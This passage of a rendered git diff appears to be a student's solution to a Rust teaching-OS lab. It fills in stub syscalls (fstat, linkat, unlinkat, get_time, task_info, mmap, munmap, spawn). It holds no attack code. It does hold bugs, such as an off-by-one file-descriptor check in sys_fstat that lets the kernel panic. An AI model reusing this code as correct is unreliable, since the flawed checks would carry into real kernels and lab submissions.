line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/fs/mod.rs b/os/src/fs/mod.rsindex 4c99179..522eb4f 100644<span class="token coord">--- a/os/src/fs/mod.rs</span><span class="token coord">+++ b/os/src/fs/mod.rs</span>@@ -15,6 +15,8 @@ pub trait File: Send + Sync &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    fn read(&amp;self, buf: UserBuffer) -> usize;</span><span class="token prefix unchanged"> </span><span class="token line">    /// write to the file from buf, return the number of bytes written</span><span class="token prefix unchanged"> </span><span class="token line">    fn write(&amp;self, buf: UserBuffer) -> usize;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// get Stat of the inode</span><span class="token prefix inserted">+</span><span class="token line">    fn get_stat(&amp;self) -> Stat;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// The stat of a inode</span></span>@@ -33,6 +35,19 @@ pub struct Stat &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pad: [u64; 7],</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">impl Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">    /// Create a new Stat with default dev and pad</span><span class="token prefix inserted">+</span><span class="token line">    pub fn new(ino: u64, mode: StatMode, nlink: u32) -> Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">        Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">            dev: 0,</span><span class="token prefix inserted">+</span><span class="token line">            ino,</span><span class="token prefix inserted">+</span><span class="token line">            mode,</span><span class="token prefix inserted">+</span><span class="token line">            nlink,</span><span class="token prefix inserted">+</span><span class="token line">            pad: [0; 7],</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">bitflags! &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    /// The mode of a inode</span><span class="token prefix unchanged"> </span><span class="token line">    /// whether a directory or a file</span></span>@@ -46,5 +61,5 @@ bitflags! &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">pub use inode::&#123;list_apps, open_file, OSInode, OpenFlags&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use inode::&#123;list_apps, open_file, OSInode, OpenFlags, ROOT_INODE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use stdio::&#123;Stdin, Stdout&#125;;</span></span>diff --git a/os/src/fs/stdio.rs b/os/src/fs/stdio.rsindex 6075a65..8b5c36f 100644<span class="token coord">--- a/os/src/fs/stdio.rs</span><span class="token coord">+++ b/os/src/fs/stdio.rs</span><span class="token coord">@@ -1,5 +1,5 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//!Stdin &amp; Stdout</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use super::File;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use super::&#123;File, Stat&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::mm::UserBuffer;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sbi::console_getchar;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::task::suspend_current_and_run_next;</span></span>@@ -39,6 +39,9 @@ impl File for Stdin &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    fn write(&amp;self, _user_buf: UserBuffer) -> usize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        panic!("Cannot write to stdin!");</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    fn get_stat(&amp;self) -> Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">        panic!("Not implemented!");</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl File for Stdout &#123;</span></span>@@ -57,4 +60,7 @@ impl File for Stdout &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">        user_buf.len()</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    fn get_stat(&amp;self) -> Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">        panic!("Not implemented!");</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/mm/frame_allocator.rs b/os/src/mm/frame_allocator.rsindex 44f20cd..2fa6939 100644<span class="token coord">--- a/os/src/mm/frame_allocator.rs</span><span class="token coord">+++ b/os/src/mm/frame_allocator.rs</span><span class="token coord">@@ -1,7 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Implementation of [`FrameAllocator`] which</span><span class="token prefix unchanged"> </span><span class="token line">//! controls all the frames in the operating system.</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;PhysAddr, PhysPageNum&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::MEMORY_END;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MEMORY_END, PAGE_SIZE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use core::fmt::&#123;self, Debug, Formatter&#125;;</span></span>@@ -134,3 +134,10 @@ pub fn frame_allocator_test() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    drop(v);</span><span class="token prefix unchanged"> </span><span class="token line">    println!("frame_allocator_test passed!");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Check if the remaining physical memory is sufficient</span><span class="token prefix inserted">+</span><span class="token line">pub fn is_mem_sufficient(_len: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let fa = FRAME_ALLOCATOR.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    let page_cnt = fa.end - fa.current + fa.recycled.len();</span><span class="token prefix inserted">+</span><span class="token line">    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>diff --git a/os/src/mm/memory_set.rs b/os/src/mm/memory_set.rsindex a5a9ede..58ac256 100644<span class="token coord">--- a/os/src/mm/memory_set.rs</span><span class="token coord">+++ b/os/src/mm/memory_set.rs</span>@@ -66,6 +66,19 @@ impl MemorySet &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            None,</span><span class="token prefix unchanged"> </span><span class="token line">        );</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Remove framed area</span><span class="token prefix inserted">+</span><span class="token line">    pub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for area in self.areas.iter_mut() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if area.vpn_range.get_start().0 == range.get_start().0 </span><span class="token prefix inserted">+</span><span class="token line">                &amp;&amp; area.vpn_range.get_end().0 == range.get_end().0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">                area.unmap(&amp;mut self.page_table);</span><span class="token prefix inserted">+</span><span class="token line">                break;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            idx += 1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        self.areas.remove(idx);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    /// remove a area</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn remove_area_with_start_vpn(&amp;mut self, start_vpn: VirtPageNum) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        if let Some((idx, area)) = self</span></span>diff --git a/os/src/mm/mod.rs b/os/src/mm/mod.rsindex d75c373..a2ac413 100644<span class="token coord">--- a/os/src/mm/mod.rs</span><span class="token coord">+++ b/os/src/mm/mod.rs</span>@@ -12,9 +12,10 @@ mod heap_allocator;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">mod memory_set;</span><span class="token prefix unchanged"> </span><span class="token line">mod page_table;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use address::VPNRange;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use address::VPNRange;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, StepByOne, VirtAddr, VirtPageNum&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">pub use frame_allocator::&#123;frame_alloc, frame_dealloc, FrameTracker&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use frame_allocator::is_mem_sufficient;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::remap_test;</span><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::&#123;kernel_token, MapPermission, MemorySet, KERNEL_SPACE&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use page_table::PTEFlags;</span></span>diff --git a/os/src/syscall/fs.rs b/os/src/syscall/fs.rsindex 864d6ba..b27deac 100644<span class="token coord">--- a/os/src/syscall/fs.rs</span><span class="token coord">+++ b/os/src/syscall/fs.rs</span><span class="token coord">@@ -1,5 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! File and filesystem-related syscalls</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::fs::&#123;open_file, OpenFlags, Stat&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::fs::&#123;open_file, OpenFlags, Stat, ROOT_INODE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::mm::&#123;translated_byte_buffer, translated_str, UserBuffer&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::task::&#123;current_task, current_user_token&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -78,26 +80,55 @@ pub fn sys_close(fd: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement fstat.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_fstat(_fd: usize, _st: *mut Stat) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_fstat NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_fstat",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    if _fd > inner.fd_table.len() &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    if let Some(file) = &amp;inner.fd_table[_fd] &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let file = file.clone();</span><span class="token prefix inserted">+</span><span class="token line">        drop(inner);</span><span class="token prefix inserted">+</span><span class="token line">        let stat: Stat = file.get_stat();</span><span class="token prefix inserted">+</span><span class="token line">        let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">            current_user_token(), _st as *const u8, size_of::&lt;Stat>());</span><span class="token prefix inserted">+</span><span class="token line">        let mut stat_ptr = &amp;stat as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">        for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">            unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">                stat_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">                stat_ptr = stat_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">        -1</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement linkat.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_linkat(_old_name: *const u8, _new_name: *const u8) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_linkat NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_linkat",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let token = current_user_token();</span><span class="token prefix inserted">+</span><span class="token line">    let _old_name = translated_str(token, _old_name);</span><span class="token prefix inserted">+</span><span class="token line">    let _new_name = translated_str(token, _new_name);</span><span class="token prefix inserted">+</span><span class="token line">    if _old_name == _new_name &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    ROOT_INODE.linkat(&amp;_old_name, &amp;_new_name)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement unlinkat.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_unlinkat(_name: *const u8) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_unlinkat NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_unlinkat",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let token = current_user_token();</span><span class="token prefix inserted">+</span><span class="token line">    let _name = translated_str(token, _name);</span><span class="token prefix inserted">+</span><span class="token line">    ROOT_INODE.unlinkat(&amp;_name)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex 613d44e..34197ed 100644<span class="token coord">--- a/os/src/syscall/mod.rs</span><span class="token coord">+++ b/os/src/syscall/mod.rs</span>@@ -59,8 +59,10 @@ use process::*;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use crate::fs::Stat;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::task::current_task;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// handle syscall exception with `syscall_id` and other arguments</span><span class="token prefix unchanged"> </span><span class="token line">pub fn syscall(syscall_id: usize, args: [usize; 4]) -> isize &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().inc_syscall_times(syscall_id);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    match syscall_id &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_OPEN => sys_open(args[1] as *const u8, args[2] as u32),</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_CLOSE => sys_close(args[0]),</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex 316897d..974412a 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,15 +1,17 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Process management syscalls</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">//!</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    config::MAX_SYSCALL_NUM,</span><span class="token prefix unchanged"> </span><span class="token line">    fs::&#123;open_file, OpenFlags&#125;,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    mm::&#123;translated_refmut, translated_str&#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    mm::&#123;translated_byte_buffer, translated_refmut, translated_str&#125;,</span><span class="token prefix inserted">+</span><span class="token line">    mm::&#123;is_mem_sufficient, VirtAddr&#125;,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    task::&#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        add_task, current_task, current_user_token, exit_current_and_run_next,</span><span class="token prefix deleted">-</span><span class="token line">        suspend_current_and_run_next, TaskStatus,</span><span class="token prefix deleted">-</span><span class="token line">    &#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        add_task, current_task, current_user_token, exit_current_and_run_next, suspend_current_and_run_next, TaskStatus</span><span class="token prefix inserted">+</span><span class="token line">    &#125;, timer::get_time_us,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#[repr(C)]</span></span>@@ -119,10 +121,24 @@ pub fn sys_waitpid(pid: isize, exit_code_ptr: *mut i32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TimeVal`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let _us = get_time_us();</span><span class="token prefix inserted">+</span><span class="token line">    let time_val = TimeVal &#123;</span><span class="token prefix inserted">+</span><span class="token line">        sec: _us / 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">        usec: _us % 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr = time_val_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Finish sys_task_info to pass testcases</span></span>@@ -130,28 +146,60 @@ pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TaskInfo`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_task_info(_ti: *mut TaskInfo) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_task_info NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_task_info",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let task_info = TaskInfo &#123;</span><span class="token prefix inserted">+</span><span class="token line">        status: TaskStatus::Running,</span><span class="token prefix inserted">+</span><span class="token line">        syscall_times: current_task().unwrap().get_syscall_times(),</span><span class="token prefix inserted">+</span><span class="token line">        time: current_task().unwrap().get_scheduled_timespan(),</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ti as *const u8, size_of::&lt;TaskInfo>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_info_ptr = &amp;task_info as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr = task_info_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement mmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_mmap(_start: usize, _len: usize, _port: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_mmap NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_mmap",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(_start);</span><span class="token prefix inserted">+</span><span class="token line">    // 1. illegal start virtual address or port</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() || _port &amp; !0x7 != 0 || _port &amp; 0x7 == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    // 2. Check is there sufficient physical memory</span><span class="token prefix inserted">+</span><span class="token line">    if !is_mem_sufficient(_len) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(_start + _len);</span><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().mmap(start_va, end_va, _port)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement munmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_munmap(_start: usize, _len: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_munmap NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_munmap",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(_start);</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(_start + _len);</span><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().munmap(start_va, end_va)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// change data segment size</span></span>@@ -168,17 +216,34 @@ pub fn sys_sbrk(size: i32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: fork + exec =/= spawn</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_spawn(_path: *const u8) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_spawn NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_spawn",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    // spawn a new process based upon _path</span><span class="token prefix inserted">+</span><span class="token line">    let token = current_user_token();</span><span class="token prefix inserted">+</span><span 